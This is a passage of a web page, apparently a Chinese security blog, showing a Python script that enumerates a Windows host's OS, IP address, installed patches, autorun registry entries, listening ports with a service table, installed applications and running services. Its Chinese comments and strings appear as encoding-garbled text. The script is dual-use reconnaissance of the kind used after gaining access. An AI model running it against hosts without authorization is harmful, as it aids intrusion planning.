è·å–ä¸»æœºå·²å®‰è£…åº”ç”¨ä¿¡æ¯......&quot;</span>)</span><br><span class="line">    <span class="comment"># åˆ—å‡º HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall ä¸‹çš„å­é¡¹åŠå…¶ DisplayName å€¼</span></span><br><span class="line">    hive1 = winreg.HKEY_LOCAL_MACHINE</span><br><span class="line">    subkey = <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot;</span></span><br><span class="line">    subkeys1 = list_registry_subkeys(hive1, subkey)</span><br><span class="line"></span><br><span class="line">    hive2 = winreg.HKEY_CURRENT_USER</span><br><span class="line">    subkeys2 = list_registry_subkeys(hive2, subkey)</span><br><span class="line">    <span class="keyword">if</span> subkeys1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] HKLM:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰“å°ç»“æœ</span></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys1:</span><br><span class="line">        subkey_path = <span class="string">r&quot;&#123;&#125;\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(subkey, subkey_name)</span><br><span class="line">        display_name = get_registry_value(hive1, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(display_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(&quot;-&quot; * 50)</span></span><br><span class="line">    <span class="keyword">if</span> subkeys2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] HKCU:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys2:</span><br><span class="line">        subkey_path = <span class="string">r&quot;&#123;&#125;\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(subkey, subkey_name)</span><br><span class="line">        display_name = get_registry_value(hive2, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(display_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAutoRunInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ä¸»æœºå¯åŠ¨é¡¹ä¿¡æ¯......&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_run, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_runonce, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_run, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_runonce, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPortInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ä¸»æœºå¼€æ”¾ç«¯å£æœåŠ¡ä¿¡æ¯......&quot;</span>)</span><br><span class="line">    services_found = []  <span class="comment"># ä¿å­˜è¯†åˆ«å‡ºçš„ç«¯å£æœåŠ¡ä¿¡æ¯</span></span><br><span class="line">    services_unfound = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = subprocess.Popen([<span class="string">&quot;netstat&quot;</span>, <span class="string">&quot;-ano&quot;</span>], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">        out, err = result.communicate()</span><br><span class="line">        netstat_output = out.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(netstat_output)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å¹¶æå–ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines():</span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;\s*TCP\s+(\S+)\s+(\S+)\s+(\S+)\s+(\d+)&#x27;</span>, line)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                local_address, _, state, pid = <span class="keyword">match</span>.groups()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># åªè¾“å‡º LISTENING çŠ¶æ€çš„ä¿¡æ¯ï¼Œå¹¶ä¸”åªæ˜¾ç¤ºæœ¬åœ°åœ°å€ã€çŠ¶æ€å’Œ PID</span></span><br><span class="line">                <span class="keyword">if</span> state <span class="keyword">in</span> [<span class="string">&quot;LISTENING&quot;</span>, <span class="string">&quot;ESTABLISHED&quot;</span>]:</span><br><span class="line">                    <span class="comment"># ä» local_address ä¸­æå– IP åœ°å€å’Œç«¯å£</span></span><br><span class="line">                    ip_port_match = re.<span class="keyword">match</span>(<span class="string">r&#x27;(\S+):(\d+)&#x27;</span>, local_address)</span><br><span class="line">                    <span class="keyword">if</span> ip_port_match:</span><br><span class="line">                        ip, port = ip_port_match.groups()</span><br><span class="line">                        <span class="comment"># å°è¯•ä»å­—å…¸ä¸­è·å–æœåŠ¡ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™è¾“å‡º &quot;Unknown Service&quot;</span></span><br><span class="line">                        service = service_port_mapping.get(<span class="built_in">int</span>(port), <span class="string">&quot;Unknown Service&quot;</span>)</span><br><span class="line">                        <span class="comment"># è¾“å‡º IPåœ°å€ã€ç«¯å£ã€çŠ¶æ€å’Œ PIDã€æœåŠ¡</span></span><br><span class="line">                        <span class="keyword">if</span> service != <span class="string">&quot;Unknown Service&quot;</span>:</span><br><span class="line">                            services_found.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            services_unfound.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æœ¬åœ°è¿æ¥IP ç«¯å£å»é‡  å¹¶ç”¨portè¿›è¡Œæ’åº</span></span><br><span class="line">        services_found = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_found&#125;]</span><br><span class="line">        services_found = <span class="built_in">sorted</span>(services_found, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        services_unfound = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_unfound&#125;]</span><br><span class="line">        services_unfound = <span class="built_in">sorted</span>(services_unfound, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] å…±åŒ¹é…åˆ° &#123;&#125; ä¸ªå·²çŸ¥ç«¯å£æœåŠ¡&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_found)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] å…±åŒ¹é…åˆ° &#123;&#125; ä¸ªæœªçŸ¥ç«¯å£æœåŠ¡&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_unfound)))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] è¯†åˆ«å‡ºçš„ç«¯å£æœåŠ¡:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_found:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_found:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  &#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] æœªè¯†åˆ«å‡ºçš„ç«¯å£æœåŠ¡:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_unfound:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_unfound:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  &#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¦‚æœæœªæ‰¾åˆ°ç›¸å…³ä¿¡æ¯ï¼Œåˆ™è¾“å‡ºä¸€æ¡æ¶ˆæ¯</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(re.<span class="keyword">match</span>(<span class="string">r&#x27;\s*TCP\s+(\S+)\s+(\S+)\s+(\S+)\s+(\d+)&#x27;</span>, line) <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] æœªæ‰¾åˆ°ç›¸å…³ä¿¡æ¯!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] é”™è¯¯: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getServiceInfo</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] è·å–ä¸»æœºæ­£åœ¨è¿è¡Œçš„æœåŠ¡......&#x27;</span>)</span><br><span class="line">        result = subprocess.Popen(<span class="string">&#x27;net start | find /v &quot;å·²ç»å¯åŠ¨ä»¥ä¸‹ Windows æœåŠ¡&quot; | find /v &quot;å‘½ä»¤æˆåŠŸå®Œæˆ&quot;&#x27;</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">        out, err = result.communicate()</span><br><span class="line">        netstat_output = out.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># å»ç©ºè¡Œ</span></span><br><span class="line">        netstat_output = <span class="string">&quot;\n&quot;</span>.join(line <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines() <span class="keyword">if</span> line.strip())</span><br><span class="line">        <span class="built_in">print</span>(netstat_output)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] é”™è¯¯: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSystemInfo</span>():</span><br><span class="line">    cmd_command1 = <span class="string">r&#x27;systeminfo | findstr /i /c:&quot;ä¸»æœºå&quot; /c:&quot;OS åç§°&quot; /c:&quot;OS ç‰ˆæœ¬&quot; | find /v &quot;BIOS ç‰ˆæœ¬&quot;&#x27;</span></span><br><span class="line">    process = subprocess.Popen(cmd_command1, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    stdout1, stderr1 = process.communicate()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(stdout1.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> stderr1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error:&quot;</span>, stderr1.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    cmd_command2 = <span class="string">r&#x27;cmd /c ipconfig | findstr /i &quot;IPv4 åœ°å€ IP Address&quot; | findstr /i /v &quot;IPv6&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">    process = subprocess.Popen(cmd_command2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    stdout2, stderr2 = process.communicate()</span><br><span class="line">    <span class="keyword">if</span> stderr2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error:&quot;</span>, stderr2.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…IPv4åœ°å€</span></span><br><span class="line">    ipv4_pattern1 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;IPv4 åœ°å€[^:]+:\s*([\d.]+)&#x27;</span>, re.IGNORECASE)</span><br><span class="line">    ipv4_pattern2 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;IP Address\. .+? : (\d+\.\d+\.\d+\.\d+)&#x27;</span>, re.IGNORECASE)</span><br><span class="line"></span><br><span class="line">    match1 = ipv4_pattern1.search(stdout2.decode(<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line">    match2 = ipv4_pattern2.search(stdout2.decode(<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> match1:</span><br><span class="line">        ipv4_address = match1.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;IPv4åœ°å€:\t\t&quot;</span>, ipv4_address)</span><br><span class="line">    <span class="keyword">elif</span> match2:</span><br><span class="line">        ipv4_address = match2.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;IPv4åœ°å€:\t\t&quot;</span>, ipv4_address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] æœªæ‰¾åˆ°IPv4åœ°å€&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cmd_command3 = <span class="string">&#x27;systeminfo&#x27;</span></span><br><span class="line">    process = subprocess.Popen(cmd_command3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    stdout3, stderr3 = process.communicate()</span><br><span class="line">    <span class="keyword">if</span> stderr3:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error:&quot;</span>, stderr3.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    kb_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;KB\d&#123;7&#125;&#x27;</span>)</span><br><span class="line">    q_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;Q\d&#123;6&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    matches_kb = kb_pattern.findall(stdout3.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">    matches_q = q_pattern.findall(stdout3.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> matches_kb:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å·²å®‰è£…&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(matches_kb)) + <span class="string">&quot;ä¸ªè¡¥ä¸:\t&quot;</span>, matches_kb)</span><br><span class="line">    <span class="keyword">if</span> matches_q:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å·²å®‰è£…&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(matches_q)) + <span class="string">&quot;ä¸ªè¡¥ä¸:\t&quot;</span>, matches_q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–è¿”å›ç </span></span><br><span class="line">    return_code = process.returncode</span><br><span class="line">    <span class="keyword">if</span> return_code != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Return Code:&quot;</span>, return_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getScheduleTaskInfo</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOSRelease</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] æ£€æµ‹åˆ°å½“å‰ä¸»æœºç³»ç»Ÿä¸º&#x27;</span>,platform.system() +<span class="string">&quot; &quot;</span>+platform.release())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] å¼€å§‹å¯¹æœ¬æœºè¿›è¡Œä¿¡æ¯æ”¶é›†,è¯·ç¨ç­‰ç‰‡åˆ»......&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getOSRelease()</span><br><span class="line">    getSystemInfo()</span><br><span class="line">    <span class="comment">#è‡ªå¯åŠ¨é¡¹ ç«¯å£ å®‰è£…åº”ç”¨ è¿è¡ŒæœåŠ¡</span></span><br><span class="line">    getAutoRunInfo()</span><br><span class="line">    getPortInfo()</span><br><span class="line">    getInstallAppInfo()</span><br><span class="line">    getServiceInfo()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ™®é€šç”¨æˆ·æ²¡æƒé™ è¿™ä¸ªå¯ä»¥è€ƒè™‘å¿½ç•¥æ‰</span></span><br><span class="line">    <span class="comment"># getScheduleTaskInfo()</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="Version4"><a href="#Version4" class="headerlink" title="Version4"></a>Version4</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> winreg</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">service_port_mapping = &#123;</span><br><span class="line">    <span class="number">21</span>: <span class="string">&quot;FTP/TFTP/VSFTPD (File Transfer Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">22</span>: <span class="string">&quot;SSH (Secure Shell)&quot;</span>,</span><br><span class="line">    <span class="number">23</span>: <span class="string">&quot;Telnet (Remote Connection)&quot;</span>,</span><br><span class="line">    <span class="number">25</span>: <span class="string">&quot;SMTP (Email)&quot;</span>,</span><br><span class="line">    <span class="number">53</span>: <span class="string">&quot;DNS (Domain Name System)&quot;</span>,</span><br><span class="line">    <span class="number">67</span>: <span class="string">&quot;DHCP (Dynamic Host Configuration Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">68</span>: <span class="string">&quot;DHCP (Dynamic Host Configuration Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">110</span>: <span class="string">&quot;POP3 (Email)&quot;</span>,</span><br><span class="line">    <span class="number">123</span>: <span class="string">&quot;NTP&quot;</span>,</span><br><span class="line">    <span class="number">135</span>: <span class="string">&quot;RPC(Remote Procedure Call)&quot;</span>,</span><br><span class="line">    <span class="number">137</span>: <span class="string">&quot;NetBIOS Name Service(NBNS)&quot;</span>,</span><br><span class="line">    <span class="number">138</span>: <span class="string">&quot;NetBIOS Datagram Service&quot;</span>,</span><br><span class="line">    <span class="number">139</span>: <span class="string">&quot;Samba (File Sharing)&quot;</span>,</span><br><span class="line">    <span class="number">143</span>: <span class="string">&quot;IMAP (Email)&quot;</span>,</span><br><span class="line">    <span class="number">161</span>: <span class="string">&quot;SNMP (Simple Network Management Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">389</span>: <span class="string">&quot;LDAP (Lightweight Directory Access Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">445</span>: <span class="string">&quot;SMB (Server Message Block)&quot;</span>,</span><br><span class="line">    <span class="number">512</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">513</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">514</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">873</span>: <span class="string">&quot;Rsync (Remote File Synchronization)&quot;</span>,</span><br><span class="line">    <span class="number">1080</span>: <span class="string">&quot;Socket&quot;</span>,</span><br><span class="line">    <span class="number">1098</span>: <span class="string">&quot;JAVARMI&quot;</span>,</span><br><span class="line">    <span class="number">1352</span>: <span class="string">&quot;Lotus Domino (Email)&quot;</span>,</span><br><span class="line">    <span class="number">1433</span>: <span class="string">&quot;MSSQL (Microsoft SQL Server)&quot;</span>,</span><br><span class="line">    <span class="number">1521</span>: <span class="string">&quot;Oracle Database&quot;</span>,</span><br><span class="line">    <span class="number">2049</span>: <span class="string">&quot;NFS (Network File System)&quot;</span>,</span><br><span class="line">    <span class="number">2181</span>: <span class="string">&quot;Zookeeper&quot;</span>,</span><br><span class="line">    <span class="number">2222</span>: <span class="string">&quot;DA&quot;</span>,</span><br><span class="line">    <span class="number">2375</span>: <span class="string">&quot;Docker Remote API&quot;</span>,</span><br><span class="line">    <span class="number">2601</span>: <span class="string">&quot;zebra&quot;</span>,</span><br><span class="line">    <span class="number">3306</span>: <span class="string">&quot;MySQL Database&quot;</span>,</span><br><span class="line">    <span class="number">3128</span>: <span class="string">&quot;squid&quot;</span>,</span><br><span class="line">    <span class="number">3389</span>: <span class="string">&quot;RDP (Remote Desktop Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">4100</span>: <span class="string">&quot;SysBase&quot;</span>,</span><br><span class="line">    <span class="number">4440</span>: <span class="string">&quot;rundeck&quot;</span>,</span><br><span class="line">    <span class="number">4848</span>: <span class="string">&quot;GlassFish Console&quot;</span>,</span><br><span class="line">    <span class="number">5000</span>: <span class="string">&quot;Sybase/DB2 Database&quot;</span>,</span><br><span class="line">    <span class="number">5422</span>: <span class="string">&quot;PostgreSQL Database&quot;</span>,</span><br><span class="line">    <span class="number">5432</span>: <span class="string">&quot;PostgreSQL Database&quot;</span>,</span><br><span class="line">    <span class="number">5632</span>: <span class="string">&quot;PCAnywhere Service&quot;</span>,</span><br><span class="line">    <span class="number">5900</span>: <span class="string">&quot;VNC (Virtual Network Computing)&quot;</span>,</span><br><span class="line">    <span class="number">5984</span>: <span class="string">&quot;CouchDB&quot;</span>,</span><br><span class="line">    <span class="number">6082</span>: <span class="string">&quot;Varnish&quot;</span>,</span><br><span class="line">    <span class="number">6379</span>: <span class="string">&quot;Redis Database&quot;</span>,</span><br><span class="line">    <span class="number">7001</span>: <span class="string">&quot;WebLogic&quot;</span>,</span><br><span class="line">    <span class="number">7002</span>: <span class="string">&quot;WebLogic&quot;</span>,</span><br><span class="line">    <span class="number">80</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">    <span class="number">443</span>: <span class="string">&quot;HTTPS&quot;</span>,</span><br><span class="line">    <span class="number">8000</span>: <span class="string">&quot;Jdwp&quot;</span>,</span><br><span class="line">    <span class="number">8069</span>: <span class="string">&quot;Zabbix&quot;</span>,</span><br><span class="line">    <span class="number">8161</span>: <span class="string">&quot;ActiveMQ&quot;</span>,</span><br><span class="line">    <span class="number">8080</span>: <span class="string">&quot;Jboss/Tomcat/Resin/GlassFish/Jenkins/Jetty&quot;</span>,</span><br><span class="line">    <span class="number">8089</span>: <span class="string">&quot;Jboss/Tomcat/Resin/GlassFish/Jenkins/Jetty&quot;</span>,</span><br><span class="line">    <span class="number">8083</span>: <span class="string">&quot;InfluxDB&quot;</span>,</span><br><span class="line">    <span class="number">8086</span>: <span class="string">&quot;InfluxDB&quot;</span>,</span><br><span class="line">    <span class="number">8980</span>: <span class="string">&quot;OpenNMS&quot;</span>,</span><br><span class="line">    <span class="number">9000</span>: <span class="string">&quot;FastCGI&quot;</span>,</span><br><span class="line">    <span class="number">9080</span>: <span class="string">&quot;Websphere Console&quot;</span>,</span><br><span class="line">    <span class="number">9090</span>: <span class="string">&quot;Websphere Console&quot;</span>,</span><br><span class="line">    <span class="number">9200</span>: <span class="string">&quot;Elasticsearch&quot;</span>,</span><br><span class="line">    <span class="number">9300</span>: <span class="string">&quot;Elasticsearch&quot;</span>,</span><br><span class="line">    <span class="number">11211</span>: <span class="string">&quot;Memcached&quot;</span>,</span><br><span class="line">    <span class="number">27017</span>: <span class="string">&quot;MongoDB&quot;</span>,</span><br><span class="line">    <span class="number">27018</span>: <span class="string">&quot;MongoDB&quot;</span>,</span><br><span class="line">    <span class="number">50000</span>: <span class="string">&quot;SAP&quot;</span>,</span><br><span class="line">    <span class="number">50010</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line">    <span class="number">50030</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line">    <span class="number">50070</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_startup_items</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = winreg.OpenKey(hive, subkey, <span class="number">0</span>, winreg.KEY_READ)</span><br><span class="line"></span><br><span class="line">        startup_items = &#123;&#125;</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                name, value, _ = winreg.EnumValue(key, index)</span><br><span class="line">                startup_items[name] = value</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="comment"># åˆ°è¾¾æ³¨å†Œè¡¨æœ«å°¾</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> startup_items</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å– HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_current_user_run = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># è¯»å– HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_current_user_runonce = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"><span class="comment"># è¯»å– HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_local_machine_run = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># è¯»å– HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_local_machine_runonce = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_startup_items</span>(<span class="params">startup_items, title</span>):</span><br><span class="line">    <span class="keyword">if</span> startup_items:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] &#123;&#125;: &quot;</span>.<span class="built_in">format</span>(title))</span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> startup_items.items():</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="comment"># print(&quot;Name: &#123;&#125;&quot;.format(name))</span></span><br><span class="line">            <span 